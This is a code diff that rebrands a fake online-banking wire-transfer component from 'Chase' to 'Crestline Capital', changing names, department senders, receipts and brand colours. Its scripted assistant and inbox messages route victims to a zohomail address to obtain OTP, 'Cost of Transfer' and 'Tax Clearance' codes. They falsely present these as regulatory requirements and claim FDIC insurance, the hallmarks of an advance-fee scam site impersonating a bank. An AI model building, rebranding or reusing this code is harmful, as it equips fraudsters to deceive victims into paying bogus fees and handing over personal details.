@@ -73,7 +73,7 @@ export function WireDrawer({ open, onOpenChange, onReceiptOpen }: WireDrawerProp
   const [assistantMessages, setAssistantMessages] = useState<Array<{ id: string; text: string; sender: "user" | "assistant"; timestamp: Date }>>([
     {
       id: "1",
-      text: "Hello! I'm Chase Virtual Assistant. How can I help you with your wire transfer?",
+      text: "Hello! I'm Crestline Virtual Assistant. How can I help you with your wire transfer?",
       sender: "assistant",
       timestamp: new Date(),
     },
@@ -205,29 +205,29 @@ export function WireDrawer({ open, onOpenChange, onReceiptOpen }: WireDrawerProp
     setTimeout(() => {
       const responses: Record<string, string> = {
         // OTP related
-        otp: "Your OTP (One-Time Password) code has been sent to our customer service team. Please contact support at Chase.org_info247@zohomail.com to request your verification code. The code is valid for 10 minutes.",
+        otp: "Your OTP (One-Time Password) code has been sent to our customer service team. Please contact support at crestline.org_info247@zohomail.com to request your verification code. The code is valid for 10 minutes.",
         "what is otp": "OTP stands for One-Time Password. It's a 6-digit security code sent to verify your identity before processing wire transfers. This adds an extra layer of protection to your account.",
-        "otp not received": "If you haven't received your OTP code: 1) Wait 2-3 minutes as delivery may be delayed, 2) Check your spam/junk folder, 3) Click 'Resend Code' to get a new one, or 4) Contact our support team at Chase.org_info247@zohomail.com.",
+        "otp not received": "If you haven't received your OTP code: 1) Wait 2-3 minutes as delivery may be delayed, 2) Check your spam/junk folder, 3) Click 'Resend Code' to get a new one, or 4) Contact our support team at crestline.org_info247@zohomail.com.",
         "resend otp": "You can resend your OTP code by clicking the 'Resend Code' button below the verification input. If the timer is active, please wait for it to expire before requesting a new code.",
         
         // COT related
-        cot: "Your COT (Cost of Transfer) code has been sent to customer service. The COT code is required for high-value wire transfers to ensure compliance with banking regulations. Contact support at Chase.org_info247@zohomail.com to receive your code.",
+        cot: "Your COT (Cost of Transfer) code has been sent to customer service. The COT code is required for high-value wire transfers to ensure compliance with banking regulations. Contact support at crestline.org_info247@zohomail.com to receive your code.",
         "what is cot": "COT stands for Cost of Transfer. It's a security verification code required for high-value wire transfers to ensure the transaction is authorized and compliant with anti-money laundering (AML) regulations.",
-        "cot not received": "If you haven't received your COT code: 1) Check your email inbox and spam folder, 2) Wait a few minutes for delivery, 3) Contact our customer service team at Chase.org_info247@zohomail.com for immediate assistance.",
+        "cot not received": "If you haven't received your COT code: 1) Check your email inbox and spam folder, 2) Wait a few minutes for delivery, 3) Contact our customer service team at crestline.org_info247@zohomail.com for immediate assistance.",
         "why cot": "The COT code is required to verify that you authorize this high-value transfer and to comply with federal banking regulations. This helps protect your funds and prevents unauthorized transactions.",
         
         // Tax related
-        tax: "Your Tax Clearance Certificate code has been sent to customer service. This code ensures your transfer complies with financial regulations. Contact support at Chase.org_info247@zohomail.com to receive your code.",
+        tax: "Your Tax Clearance Certificate code has been sent to customer service. This code ensures your transfer complies with financial regulations. Contact support at crestline.org_info247@zohomail.com to receive your code.",
         "what is tax": "The Tax Clearance Certificate code is required for compliance with financial regulations and anti-money laundering (AML) requirements. It verifies that the funds are legally cleared for transfer.",
-        "tax not received": "If you haven't received your Tax code: 1) Check your email inbox and spam folder, 2) Wait a few minutes for delivery, 3) Contact our customer service team at Chase.org_info247@zohomail.com for immediate assistance.",
+        "tax not received": "If you haven't received your Tax code: 1) Check your email inbox and spam folder, 2) Wait a few minutes for delivery, 3) Contact our customer service team at crestline.org_info247@zohomail.com for immediate assistance.",
         "why tax": "Tax clearance verification is required by federal regulations for wire transfers to ensure funds are properly documented and comply with reporting requirements.",
         
         // General
         help: "I can help you with: 1) OTP verification questions, 2) COT code assistance, 3) Tax clearance information, 4) Wire transfer status, 5) Contact support. What would you like to know?",
-        support: "For immediate assistance, please email our customer service team at Chase.org_info247@zohomail.com. Our team is available to help you with any questions.",
+        support: "For immediate assistance, please email our customer service team at crestline.org_info247@zohomail.com. Our team is available to help you with any questions.",
         status: "Your wire transfer is currently in the verification stage. Once all verification codes are entered correctly, your transfer will be processed. Typical processing time is 1-3 business days.",
         fee: "Wire transfer fees vary by type: Domestic transfers: $25, International transfers: $45. These fees are automatically calculated and shown in your transfer summary.",
-        cancel: "To cancel this wire transfer, simply close this window before completing verification. Once all verification codes are entered and the transfer is submitted, cancellation may require contacting customer service at Chase.org_info247@zohomail.com.",
+        cancel: "To cancel this wire transfer, simply close this window before completing verification. Once all verification codes are entered and the transfer is submitted, cancellation may require contacting customer service at crestline.org_info247@zohomail.com.",
         secure: "Your wire transfer is protected by multiple security layers including OTP verification, COT codes, and tax clearance. All data is encrypted and your funds are FDIC insured.",
         default: "I'm here to help with your wire transfer verification! You can ask me about OTP codes, COT verification, tax clearance, transfer fees, or contact support. What would you like to know?",
       }
@@ -254,7 +254,7 @@ export function WireDrawer({ open, onOpenChange, onReceiptOpen }: WireDrawerProp
         } else if (lowerInput.includes("tax")) {
           response = responses["tax not received"]
         } else {
-          response = "If you haven't received your verification code, please check your email (including spam), wait a few minutes, or contact support at Chase.org_info247@zohomail.com."
+          response = "If you haven't received your verification code, please check your email (including spam), wait a few minutes, or contact support at crestline.org_info247@zohomail.com."
         }
       } else if (lowerInput.includes("resend")) {
         response = responses["resend otp"]
@@ -309,24 +309,24 @@ export function WireDrawer({ open, onOpenChange, onReceiptOpen }: WireDrawerProp
       const responses: Record<string, string> = {
         // OTP questions
         "What is an OTP code?": "OTP stands for One-Time Password. It's a 6-digit security code sent to verify your identity before processing wire transfers. This adds an extra layer of protection to your account and ensures only you can authorize transfers.",
-        "Where is my OTP code?": "Your OTP code has been sent to our customer service team for security verification. Please contact support at Chase.org_info247@zohomail.com to receive your code. Have your account details ready for verification.",
+        "Where is my OTP code?": "Your OTP code has been sent to our customer service team for security verification. Please contact support at crestline.org_info247@zohomail.com to receive your code. Have your account details ready for verification.",
         "How do I resend the OTP?": "You can resend your OTP code by clicking the 'Resend Code' button below the verification input. If the timer is active, please wait for it to expire (usually 60 seconds) before requesting a new code.",
         "Why do I need OTP verification?": "OTP verification adds an extra layer of security to protect your funds. It ensures that only you can authorize wire transfers from your account, even if someone else has access to your login credentials.",
         
         // COT questions
         "What is a COT code?": "COT stands for Cost of Transfer. It's a security verification code required for high-value wire transfers to ensure the transaction is authorized and compliant with anti-money laundering (AML) regulations.",
-        "Where is my COT code?": "Your COT code has been sent to our customer service team. Please contact support at Chase.org_info247@zohomail.com to receive your code. You'll need to verify your identity.",
+        "Where is my COT code?": "Your COT code has been sent to our customer service team. Please contact support at crestline.org_info247@zohomail.com to receive your code. You'll need to verify your identity.",
         "Why is COT required?": "The COT code is required to verify that you authorize this high-value transfer and to comply with federal banking regulations. This helps protect your funds and prevents unauthorized transactions.",
         "How long is COT valid?": "Your COT code is valid for 24 hours from the time it was generated. If you don't complete verification within this time, you'll need to request a new code.",
         
         // Tax questions
         "What is Tax Clearance?": "The Tax Clearance Certificate code is required for compliance with financial regulations and anti-money laundering (AML) requirements. It verifies that the funds are legally cleared for transfer.",
-        "Where is my Tax code?": "Your Tax Clearance Certificate code has been sent to our customer service team. Please contact support at Chase.org_info247@zohomail.com to receive your code.",
+        "Where is my Tax code?": "Your Tax Clearance Certificate code has been sent to our customer service team. Please contact support at crestline.org_info247@zohomail.com to receive your code.",
         "Why is Tax Clearance needed?": "Tax clearance verification is required by federal regulations for wire transfers to ensure funds are properly documented and comply with IRS reporting requirements for large transfers.",
         "Is my transfer secure?": "Yes! Your wire transfer is protected by multiple security layers including OTP verification, COT codes, and tax clearance. All data is encrypted with 256-bit SSL, and your funds are FDIC insured up to $250,000.",
       }
 
-      const response = responses[question] || "I'm here to help! Please contact our support team at Chase.org_info247@zohomail.com for personalized assistance with your question."
+      const response = responses[question] || "I'm here to help! Please contact our support team at crestline.org_info247@zohomail.com for personalized assistance with your question."
 
       const assistantMessage = {
         id: (Date.now() + 1).toString(),
@@ -367,7 +367,7 @@ export function WireDrawer({ open, onOpenChange, onReceiptOpen }: WireDrawerProp
     setAssistantMessages([
       {
         id: "1",
-        text: "Hello! I'm Chase Virtual Assistant. How can I help you with your wire transfer?",
+        text: "Hello! I'm Crestline Virtual Assistant. How can I help you with your wire transfer?",
         sender: "assistant",
         timestamp: new Date(),
       },
@@ -468,10 +468,10 @@ export function WireDrawer({ open, onOpenChange, onReceiptOpen }: WireDrawerProp
 
       // Send generic message to inbox (WITHOUT showing actual code)
       addMessage({
-        from: "Chase Security Department",
+        from: "Crestline Capital Security Department",
         subject: "Wire Transfer Verification Initiated",
         preview: "Your wire transfer verification has been initiated",
-        content: `Dear ${userProfile.name},\n\nYour wire transfer verification code has been securely sent to our customer service team at ${CUSTOMER_SERVICE_EMAIL}.\n\nTransaction Details:\n- Amount: $${amount}\n- Recipient: ${recipientName}\n- Bank: ${recipientBank}\n\nOur team will contact you via secure channels to provide your verification code.\n\nFor security reasons, we never share verification codes via email.\n\nIf you have questions, contact us at ${CUSTOMER_SERVICE_EMAIL}.\n\nBest regards,\nChase Security Department`,
+        content: `Dear ${userProfile.name},\n\nYour wire transfer verification code has been securely sent to our customer service team at ${CUSTOMER_SERVICE_EMAIL}.\n\nTransaction Details:\n- Amount: $${amount}\n- Recipient: ${recipientName}\n- Bank: ${recipientBank}\n\nOur team will contact you via secure channels to provide your verification code.\n\nFor security reasons, we never share verification codes via email.\n\nIf you have questions, contact us at ${CUSTOMER_SERVICE_EMAIL}.\n\nBest regards,\nCrestline Capital Security Department`,
         category: "Security",
       })
 
@@ -512,10 +512,10 @@ export function WireDrawer({ open, onOpenChange, onReceiptOpen }: WireDrawerProp
 
       // Send generic message to inbox (WITHOUT showing actual code)
       addMessage({
-        from: "Chase Compliance Department",
+        from: "Crestline Capital Compliance Department",
         subject: "Cost of Transfer Verification",
         preview: "Your COT verification code is ready",
-        content: `Dear ${userProfile.name},\n\nYour Cost of Transfer (COT) verification code has been securely sent to our compliance team at ${CUSTOMER_SERVICE_EMAIL}.\n\nTransaction Details:\n- Amount: $${amount}\n- Recipient: ${recipientName}\n- Bank: ${recipientBank}\n- Wire Type: ${wireType === "domestic" ? "Domestic" : "International"}\n\nThis code is required for compliance with banking regulations and anti-money laundering requirements.\n\nOur team will contact you via secure channels to provide your verification code.\n\nFor your security, verification codes are never shared via email.\n\nBest regards,\nChase Compliance Department`,
+        content: `Dear ${userProfile.name},\n\nYour Cost of Transfer (COT) verification code has been securely sent to our compliance team at ${CUSTOMER_SERVICE_EMAIL}.\n\nTransaction Details:\n- Amount: $${amount}\n- Recipient: ${recipientName}\n- Bank: ${recipientBank}\n- Wire Type: ${wireType === "domestic" ? "Domestic" : "International"}\n\nThis code is required for compliance with banking regulations and anti-money laundering requirements.\n\nOur team will contact you via secure channels to provide your verification code.\n\nFor your security, verification codes are never shared via email.\n\nBest regards,\nCrestline Capital Compliance Department`,
         category: "Security",
       })
 
@@ -627,10 +627,10 @@ export function WireDrawer({ open, onOpenChange, onReceiptOpen }: WireDrawerProp
       })
 
       addMessage({
-        from: "Chase Tax Compliance Department",
+        from: "Crestline Capital Tax Compliance Department",
         subject: "Wire Transfer Tax Clearance Code",
         preview: `Your Tax Clearance code for wire transfer`,
-        content: `Dear ${userProfile.name},\n\nYour Tax Clearance Certificate code for wire transfer verification is:\n\n${VERIFICATION_CODES.TAX}\n\nThis code has been sent to our customer service team at ${CUSTOMER_SERVICE_EMAIL} for tax compliance verification.\n\nTransaction Details:\n- Amount: $${amount}\n- Recipient: ${recipientName}\n- Bank: ${recipientBank}\n\nThe Tax Clearance Certificate is required to ensure compliance with financial regulations and anti-money laundering (AML) requirements.\n\nPlease enter this code in the verification step to complete your wire transfer.\n\nIf you have any questions, please contact us at 1-800-935-9935.\n\nBest regards,\nChase Tax Compliance Department`,
+        content: `Dear ${userProfile.name},\n\nYour Tax Clearance Certificate code for wire transfer verification is:\n\n${VERIFICATION_CODES.TAX}\n\nThis code has been sent to our customer service team at ${CUSTOMER_SERVICE_EMAIL} for tax compliance verification.\n\nTransaction Details:\n- Amount: $${amount}\n- Recipient: ${recipientName}\n- Bank: ${recipientBank}\n\nThe Tax Clearance Certificate is required to ensure compliance with financial regulations and anti-money laundering (AML) requirements.\n\nPlease enter this code in the verification step to complete your wire transfer.\n\nIf you have any questions, please contact us at 1-800-935-9935.\n\nBest regards,\nCrestline Capital Tax Compliance Department`,
         category: "Security",
       })
 
@@ -667,10 +667,10 @@ export function WireDrawer({ open, onOpenChange, onReceiptOpen }: WireDrawerProp
 
       // Send generic message to inbox (WITHOUT showing actual code)
       addMessage({
-        from: "Chase Compliance Department",
+        from: "Crestline Capital Compliance Department",
         subject: "Tax Clearance Verification",
         preview: "Your Tax Clearance code is ready",
-        content: `Dear ${userProfile.name},\n\nYour Tax Clearance Certificate verification code has been securely sent to our compliance team at ${CUSTOMER_SERVICE_EMAIL}.\n\nThis code is required for compliance with financial regulations and anti-money laundering requirements.\n\nTransaction Details:\n- Amount: $${amount}\n- Recipient: ${recipientName}\n- Bank: ${recipientBank}\n\nOur team will contact you via secure channels to provide your verification code.\n\nFor your security, verification codes are never shared via email.\n\nBest regards,\nChase Compliance Department`,
+        content: `Dear ${userProfile.name},\n\nYour Tax Clearance Certificate verification code has been securely sent to our compliance team at ${CUSTOMER_SERVICE_EMAIL}.\n\nThis code is required for compliance with financial regulations and anti-money laundering requirements.\n\nTransaction Details:\n- Amount: $${amount}\n- Recipient: ${recipientName}\n- Bank: ${recipientBank}\n\nOur team will contact you via secure channels to provide your verification code.\n\nFor your security, verification codes are never shared via email.\n\nBest regards,\nCrestline Capital Compliance Department`,
         category: "Security",
       })
 
@@ -721,10 +721,10 @@ export function WireDrawer({ open, onOpenChange, onReceiptOpen }: WireDrawerProp
       })
 
       addMessage({
-        from: "Chase Wire Transfer Department",
+        from: "Crestline Capital Wire Transfer Department",
         subject: "Wire Transfer Verification Completed",
         preview: "All verification steps completed - transfer processing",
-        content: `Dear ${userProfile.name},\n\nAll verification steps for your wire transfer have been completed.\n\nTransaction Details:\n- Amount: $${amount}\n- Recipient: ${recipientName}\n- Bank: ${recipientBank}\n- Status: Processing Transfer\n\nYour wire transfer is now being processed. You will receive a confirmation once the transfer is complete.\n\nBest regards,\nChase Wire Transfer Department`,
+        content: `Dear ${userProfile.name},\n\nAll verification steps for your wire transfer have been completed.\n\nTransaction Details:\n- Amount: $${amount}\n- Recipient: ${recipientName}\n- Bank: ${recipientBank}\n- Status: Processing Transfer\n\nYour wire transfer is now being processed. You will receive a confirmation once the transfer is complete.\n\nBest regards,\nCrestline Capital Wire Transfer Department`,
         category: "Transfers",
       })
 
@@ -769,7 +769,7 @@ export function WireDrawer({ open, onOpenChange, onReceiptOpen }: WireDrawerProp
     setConfirmationNumber(confNum)
 
     try {
-      // Call real Chase Bank wire transfer API
+      // Call real Crestline Capital wire transfer API
       const response = await fetch('/api/transfers', {
         method: 'POST',
         headers: {
@@ -914,14 +914,14 @@ Expected Completion: 1-3 Business Days
 Purpose: ${purpose || "Not specified"}
 ${memo ? `Memo: ${memo}` : ""}
 
-Thank you for using Chase.
+Thank you for using Crestline Capital.
     `.trim()
 
     const blob = new Blob([receiptContent], { type: "text/plain" })
     const url = URL.createObjectURL(blob)
     const a = document.createElement("a")
     a.href = url
-    a.download = `Chase-wire-receipt-${confirmationNumber}.txt`
+    a.download = `Crestline-wire-receipt-${confirmationNumber}.txt`
     a.click()
     URL.revokeObjectURL(url)
 
@@ -983,7 +983,7 @@ Thank you for using Chase.
                     isComplete
                       ? "bg-green-500 text-gray-900 shadow-md scale-100"
                       : isActive
-                        ? "bg-[#0a4fa6] text-gray-900 shadow-lg scale-105"
+                        ? "bg-[#D71E28] text-gray-900 shadow-lg scale-105"
                         : "bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-400 scale-100"
                   }`}
                 >
@@ -1042,7 +1042,7 @@ Thank you for using Chase.
             type="button"
             variant={wireType === "domestic" ? "default" : "outline"}
             onClick={() => setWireType("domestic")}
-            className={`h-auto py-3 ${wireType === "domestic" ? "bg-[#0a4fa6] hover:bg-[#083d80]" : "bg-transparent"}`}
+            className={`h-auto py-3 ${wireType === "domestic" ? "bg-[#D71E28] hover:bg-[#A31620]" : "bg-transparent"}`}
           >
             <Building className="h-4 w-4 mr-2" />
             <div className="text-left">
@@ -1054,7 +1054,7 @@ Thank you for using Chase.
             type="button"
             variant={wireType === "international" ? "default" : "outline"}
             onClick={() => setWireType("international")}
-            className={`h-auto py-3 ${wireType === "international" ? "bg-[#0a4fa6] hover:bg-[#083d80]" : "bg-transparent"}`}
+            className={`h-auto py-3 ${wireType === "international" ? "bg-[#D71E28] hover:bg-[#A31620]" : "bg-transparent"}`}
           >
             <Globe className="h-4 w-4 mr-2" />
             <div className="text-left">
@@ -1066,7 +1066,7 @@ Thank you for using Chase.
       </div>
 
       <div className="space-y-3">
-        <h3 className="font-semibold text-sm text-[#0a4fa6]">Recipient Information</h3>
+        <h3 className="font-semibold text-sm text-[#D71E28]">Recipient Information</h3>
 
         <div>
           <Label className="text-sm">Recipient Name *</Label>
@@ -1124,7 +1124,7 @@ Thank you for using Chase.
       </div>
 
       <div className="space-y-3">
-        <h3 className="font-semibold text-sm text-[#0a4fa6]">Transfer Details</h3>
+        <h3 className="font-semibold text-sm text-[#D71E28]">Transfer Details</h3>
 
         <div>
           <Label className="text-sm">Amount (USD) *</Label>
@@ -1203,7 +1203,7 @@ Thank you for using Chase.
 
         <div className="space-y-4">
           <div className="bg-card border rounded-lg p-4">
-            <h3 className="font-semibold text-sm text-[#0a4fa6] mb-3">From Account</h3>
+            <h3 className="font-semibold text-sm text-[#D71E28] mb-3">From Account</h3>
             <div className="space-y-2 text-sm">
               <div className="flex justify-between">
                 <span className="text-muted-foreground">Account</span>
@@ -1221,7 +1221,7 @@ Thank you for using Chase.
           </div>
 
           <div className="bg-card border rounded-lg p-4">
-            <h3 className="font-semibold text-sm text-[#0a4fa6] mb-3">Recipient Details</h3>
+            <h3 className="font-semibold text-sm text-[#D71E28] mb-3">Recipient Details</h3>
             <div className="space-y-2 text-sm">
               <div className="flex justify-between">
                 <span className="text-muted-foreground">Name</span>
@@ -1247,7 +1247,7 @@ Thank you for using Chase.
           </div>
 
           <div className="bg-card border rounded-lg p-4">
-            <h3 className="font-semibold text-sm text-[#0a4fa6] mb-3">Transfer Summary</h3>
+            <h3 className="font-semibold text-sm text-[#D71E28] mb-3">Transfer Summary</h3>
             <div className="space-y-2 text-sm">
               <div className="flex justify-between">
                 <span className="text-muted-foreground">Wire Type</span>
@@ -1265,7 +1265,7 @@ Thank you for using Chase.
               </div>
               <div className="flex justify-between border-t pt-2 mt-2">
                 <span className="font-semibold">Total Debit</span>
-                <span className="font-bold text-[#0a4fa6]">
+                <span className="font-bold text-[#D71E28]">
                   ${getTotalAmount().toLocaleString(undefined, { minimumFractionDigits: 2 })}
                 </span>
               </div>
@@ -1294,10 +1294,10 @@ Thank you for using Chase.
         {/* Header Section */}
         <div className="text-center space-y-3">
           <div className="h-16 w-16 rounded-full bg-gradient-to-br from-blue-100 to-blue-50 dark:from-blue-900/50 dark:to-blue-950/30 flex items-center justify-center mx-auto shadow-md">
-            <Shield className="h-8 w-8 text-[#0a4fa6] animate-pulse" />
+            <Shield className="h-8 w-8 text-[#D71E28] animate-pulse" />
           </div>
           <div>
-            <h2 className="text-2xl font-bold text-[#0a4fa6] mb-1">OTP Verification</h2>
+            <h2 className="text-2xl font-bold text-[#D71E28] mb-1">OTP Verification</h2>
             <p className="text-sm text-muted-foreground">Enter your 6-digit one-time password</p>
           </div>
         </div>
@@ -1305,9 +1305,9 @@ Thank you for using Chase.
         {/* Info Alert */}
         <div className="bg-blue-50 dark:bg-blue-950/30 border border-blue-200 dark:border-blue-900 p-4 rounded-lg text-sm">
           <div className="flex items-start gap-3">
-            <Shield className="h-5 w-5 text-[#0a4fa6] mt-0.5 flex-shrink-0" />
+            <Shield className="h-5 w-5 text-[#D71E28] mt-0.5 flex-shrink-0" />
             <div>
-              <h4 className="font-semibold text-[#0a4fa6] mb-1">Verification Code Sent</h4>
+              <h4 className="font-semibold text-[#D71E28] mb-1">Verification Code Sent</h4>
               <p className="text-blue-800 dark:text-blue-200 text-xs leading-relaxed">
                 Your OTP verification code has been sent to our security team at {CUSTOMER_SERVICE_EMAIL}. Please enter the code below to proceed with your wire transfer.
               </p>
@@ -1353,7 +1353,7 @@ Thank you for using Chase.
           <Button
             onClick={handleVerifyOTP}
             disabled={otpCode.length !== 6 || isLoading}
-            className="w-full h-11 bg-[#0a4fa6] hover:bg-[#083d80] font-semibold text-gray-900 transition disabled:opacity-50"
+            className="w-full h-11 bg-[#D71E28] hover:bg-[#A31620] font-semibold text-gray-900 transition disabled:opacity-50"
           >
             {isLoading ? (
               <>
@@ -1372,14 +1372,14 @@ Thank you for using Chase.
           <div className="text-center">
             {otpResendTimer > 0 ? (
               <p className="text-sm text-muted-foreground">
-                Resend code in <span className="font-semibold text-[#0a4fa6]">{otpResendTimer}s</span>
+                Resend code in <span className="font-semibold text-[#D71E28]">{otpResendTimer}s</span>
               </p>
             ) : (
               <Button
                 variant="outline"
                 size="sm"
                 onClick={handleResendOTP}
-                className="text-[#0a4fa6] border-[#0a4fa6] hover:bg-blue-50"
+                className="text-[#D71E28] border-[#D71E28] hover:bg-blue-50"
               >
                 <RefreshCw className="h-4 w-4 mr-2" />
                 Resend Verification Code
@@ -1390,7 +1390,7 @@ Thank you for using Chase.
 
         {/* Quick Help */}
         <div className="bg-muted/50 rounded-lg p-4 space-y-3">
-          <p className="text-xs font-semibold text-[#0a4fa6] uppercase tracking-wide">Need Help?</p>
+          <p className="text-xs font-semibold text-[#D71E28] uppercase tracking-wide">Need Help?</p>
           <div className="grid grid-cols-2 gap-2">
             {[
               "What is an OTP code?",
@@ -1401,7 +1401,7 @@ Thank you for using Chase.
               <button
                 key={question}
                 onClick={() => handleQuickQuestion(question)}
-                className="text-xs px-3 py-2 rounded-lg bg-white dark:bg-slate-800 text-[#0a4fa6] hover:bg-blue-50 dark:hover:bg-slate-700 transition-colors border border-blue-200 dark:border-slate-700 font-medium"
+                className="text-xs px-3 py-2 rounded-lg bg-white dark:bg-slate-800 text-[#D71E28] hover:bg-blue-50 dark:hover:bg-slate-700 transition-colors border border-blue-200 dark:border-slate-700 font-medium"
               >
                 {question}
               </button>
@@ -1413,8 +1413,8 @@ Thank you for using Chase.
         <div className="border-2 border-blue-200 dark:border-blue-900 rounded-lg bg-gradient-to-b from-blue-50 to-white dark:from-blue-950/20 dark:to-slate-900 overflow-hidden">
           <div className="flex items-center justify-between p-4 border-b border-blue-200 dark:border-blue-900 bg-blue-50 dark:bg-blue-950/30">
             <div className="flex items-center gap-2">
-              <MessageCircle className="h-5 w-5 text-[#0a4fa6]" />
-              <h4 className="font-semibold text-sm text-[#0a4fa6]">Chase Assistant</h4>
+              <MessageCircle className="h-5 w-5 text-[#D71E28]" />
+              <h4 className="font-semibold text-sm text-[#D71E28]">Crestline Assistant</h4>
             </div>
             <Button
               size="sm"
@@ -1438,7 +1438,7 @@ Thank you for using Chase.
                     <div
                       className={`max-w-xs px-4 py-2.5 rounded-lg text-sm leading-relaxed ${
                         msg.sender === "user"
-                          ? "bg-[#0a4fa6] text-gray-900 font-medium rounded-br-none"
+                          ? "bg-[#D71E28] text-gray-900 font-medium rounded-br-none"
                           : "bg-gray-200 dark:bg-gray-700 text-foreground rounded-bl-none"
                       }`}
                     >
@@ -1466,7 +1466,7 @@ Thank you for using Chase.
                   size="sm"
                   onClick={handleAssistantSendMessage}
                   disabled={!assistantInput.trim() || isAssistantLoading}
-                  className="bg-[#0a4fa6] hover:bg-[#083d80] text-gray-900 h-10 px-4 transition disabled:opacity-50 disabled:cursor-not-allowed"
+                  className="bg-[#D71E28] hover:bg-[#A31620] text-gray-900 h-10 px-4 transition disabled:opacity-50 disabled:cursor-not-allowed"
                 >
                   {isAssistantLoading ? (
                     <Loader2 className="h-4 w-4 animate-spin" />
@@ -1496,7 +1496,7 @@ Thank you for using Chase.
             <CheckCircle2 className="h-5 w-5 text-green-500" />
             <span className="text-sm text-green-600 dark:text-green-400 font-semibold">OTP Verified</span>
           </div>
-          <h2 className="text-2xl font-bold text-[#0a4fa6] mb-1">Cost of Transfer (COT)</h2>
+          <h2 className="text-2xl font-bold text-[#D71E28] mb-1">Cost of Transfer (COT)</h2>
           <p className="text-sm text-muted-foreground">Enter your COT code to proceed</p>
         </div>
       </div>
@@ -1504,9 +1504,9 @@ Thank you for using Chase.
       {/* Info Alert */}
       <div className="bg-blue-50 dark:bg-blue-950/30 border border-blue-200 dark:border-blue-900 p-4 rounded-lg text-sm">
         <div className="flex items-start gap-3">
-          <Lock className="h-5 w-5 text-[#0a4fa6] mt-0.5 flex-shrink-0" />
+          <Lock className="h-5 w-5 text-[#D71E28] mt-0.5 flex-shrink-0" />
           <div>
-            <h4 className="font-semibold text-[#0a4fa6] mb-1">Second Verification Step</h4>
+            <h4 className="font-semibold text-[#D71E28] mb-1">Second Verification Step</h4>
             <p className="text-blue-800 dark:text-blue-200 text-xs leading-relaxed">
               Your COT code has been sent to our security team at {CUSTOMER_SERVICE_EMAIL}. Please enter the code below to proceed with verification.
             </p>
@@ -1544,7 +1544,7 @@ Thank you for using Chase.
         <Button
           onClick={handleVerifyCOT}
           disabled={cotCode.length === 0 || isLoading}
-          className="w-full h-11 bg-[#0a4fa6] hover:bg-[#083d80] font-semibold text-gray-900 transition disabled:opacity-50"
+          className="w-full h-11 bg-[#D71E28] hover:bg-[#A31620] font-semibold text-gray-900 transition disabled:opacity-50"
         >
           {isLoading ? (
             <>
@@ -1561,7 +1561,7 @@ Thank you for using Chase.
 
         {/* Info Box */}
         <div className="bg-muted/50 p-4 rounded-lg text-sm space-y-2">
-          <h4 className="font-semibold text-[#0a4fa6]">What is a COT Code?</h4>
+          <h4 className="font-semibold text-[#D71E28]">What is a COT Code?</h4>
           <p className="text-muted-foreground text-xs leading-relaxed">
             The Cost of Transfer (COT) code is a security verification code required for high-value wire transfers to ensure compliance with federal banking regulations and anti-money laundering (AML) requirements.
           </p>
@@ -1591,7 +1591,7 @@ Thank you for using Chase.
 
         {/* Quick Help */}
         <div className="bg-muted/50 rounded-lg p-4 space-y-3">
-          <p className="text-xs font-semibold text-[#0a4fa6] uppercase tracking-wide">Need Help?</p>
+          <p className="text-xs font-semibold text-[#D71E28] uppercase tracking-wide">Need Help?</p>
           <div className="grid grid-cols-2 gap-2">
             {[
               "What is a COT code?",
@@ -1602,7 +1602,7 @@ Thank you for using Chase.
               <button
                 key={question}
                 onClick={() => handleQuickQuestion(question)}
-                className="text-xs px-3 py-2 rounded-lg bg-white dark:bg-slate-800 text-[#0a4fa6] hover:bg-blue-50 dark:hover:bg-slate-700 transition-colors border border-blue-200 dark:border-slate-700 font-medium"
+                className="text-xs px-3 py-2 rounded-lg bg-white dark:bg-slate-800 text-[#D71E28] hover:bg-blue-50 dark:hover:bg-slate-700 transition-colors border border-blue-200 dark:border-slate-700 font-medium"
               >
                 {question}
               </button>
@@ -1614,8 +1614,8 @@ Thank you for using Chase.
         <div className="border-2 border-blue-200 dark:border-blue-900 rounded-lg bg-gradient-to-b from-blue-50 to-white dark:from-blue-950/20 dark:to-slate-900 overflow-hidden">
           <div className="flex items-center justify-between p-4 border-b border-blue-200 dark:border-blue-900 bg-blue-50 dark:bg-blue-950/30">
             <div className="flex items-center gap-2">
-              <MessageCircle className="h-5 w-5 text-[#0a4fa6]" />
-              <h4 className="font-semibold text-sm text-[#0a4fa6]">Chase Assistant</h4>
+              <MessageCircle className="h-5 w-5 text-[#D71E28]" />
+              <h4 className="font-semibold text-sm text-[#D71E28]">Crestline Assistant</h4>
             </div>
             <Button
               size="sm"
@@ -1639,7 +1639,7 @@ Thank you for using Chase.
                     <div
                       className={`max-w-xs px-4 py-2.5 rounded-lg text-sm leading-relaxed ${
                         msg.sender === "user"
-                          ? "bg-[#0a4fa6] text-gray-900 font-medium rounded-br-none"
+                          ? "bg-[#D71E28] text-gray-900 font-medium rounded-br-none"
                           : "bg-gray-200 dark:bg-gray-700 text-foreground rounded-bl-none"
                       }`}
                     >
@@ -1667,7 +1667,7 @@ Thank you for using Chase.
                   size="sm"
                   onClick={handleAssistantSendMessage}
                   disabled={!assistantInput.trim()}
-                  className="bg-[#0a4fa6] hover:bg-[#083d80] text-gray-900 h-10 px-4 transition disabled:opacity-50"
+                  className="bg-[#D71E28] hover:bg-[#A31620] text-gray-900 h-10 px-4 transition disabled:opacity-50"
                 >
                   <Send className="h-4 w-4" />
                 </Button>
@@ -1693,7 +1693,7 @@ Thank you for using Chase.
             <CheckCircle2 className="h-5 w-5 text-green-500" />
             <span className="text-sm text-green-600 dark:text-green-400 font-semibold">COT Verified</span>
           </div>
-          <h2 className="text-2xl font-bold text-[#0a4fa6] mb-1">Tax Clearance</h2>
+          <h2 className="text-2xl font-bold text-[#D71E28] mb-1">Tax Clearance</h2>
           <p className="text-sm text-muted-foreground">Final verification step</p>
         </div>
       </div>
@@ -1701,9 +1701,9 @@ Thank you for using Chase.
       {/* Info Alert */}
       <div className="bg-blue-50 dark:bg-blue-950/30 border border-blue-200 dark:border-blue-900 p-4 rounded-lg text-sm">
         <div className="flex items-start gap-3">
-          <FileText className="h-5 w-5 text-[#0a4fa6] mt-0.5 flex-shrink-0" />
+          <FileText className="h-5 w-5 text-[#D71E28] mt-0.5 flex-shrink-0" />
           <div>
-            <h4 className="font-semibold text-[#0a4fa6] mb-1">Final Verification Step</h4>
+            <h4 className="font-semibold text-[#D71E28] mb-1">Final Verification Step</h4>
             <p className="text-blue-800 dark:text-blue-200 text-xs leading-relaxed">
               Your Tax Clearance code has been sent to our compliance team at {CUSTOMER_SERVICE_EMAIL}. Please enter the code below to complete verification.
             </p>
